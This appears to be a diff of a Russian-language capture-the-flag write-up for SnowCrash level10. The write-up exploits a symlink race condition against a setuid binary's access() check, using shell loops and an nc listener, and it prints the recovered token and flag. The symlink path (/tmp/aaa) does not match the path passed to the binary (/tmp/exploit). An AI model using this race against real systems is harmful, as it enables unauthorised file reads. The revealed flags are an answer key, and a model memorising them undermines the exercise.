@@ -1,7 +1,45 @@
-```bash
-level10@SnowCrash:~$ ltrace ./level10 token localhost
-__libc_start_main(0x80486d4, 3, 0xbffff7e4, 0x8048970, 0x80489e0 <unfinished ...>
-access("token", 4)                                                                                                                             = -1
-printf("You don't have access to %s\n", "token"You don't have access to token
-)   
-```
+В папке у нас два файла. Токен и приложение level10
+
+К Токену у нас нет доступа.
+
+level10 требует два параметра, файл для отправки и адрес отправки.
+При декомпиляции выяснилось что программа отправляет данные на порт 6969.
+Так же, очевидно что данные отправлять нам нужно на локалхост (127.0.0.1), т.к. в локальной сети больше ничего у нас нет.
+Как мы видим, у level10 и token есть права на чтение/запись для user flag10 
+Мы попытаемся получить доступ к level10, но вместо этого откроем token
+Для этого мы создадим символьную ссылку, которая будет почти мгновенно переключаться между level10 и token
+
+while true; 
+do ln -fs ~/level10 /tmp/aaa; 
+ln -fs ~/token /tmp/aaa; 
+done
+
+Затем мы будем бесконечно вызывать ./level10
+
+while true; 
+do ./level10 /tmp/exploit 127.0.0.1; 
+done
+
+Начинаем слушать порт 6969
+
+nc -lk 6969
+...
+...
+...
+...
+PROFIT!
+
+Среди кучи мусорных данных находим ключ!
+
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+
+sy flag10
+getflag
+
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+
+
+
+
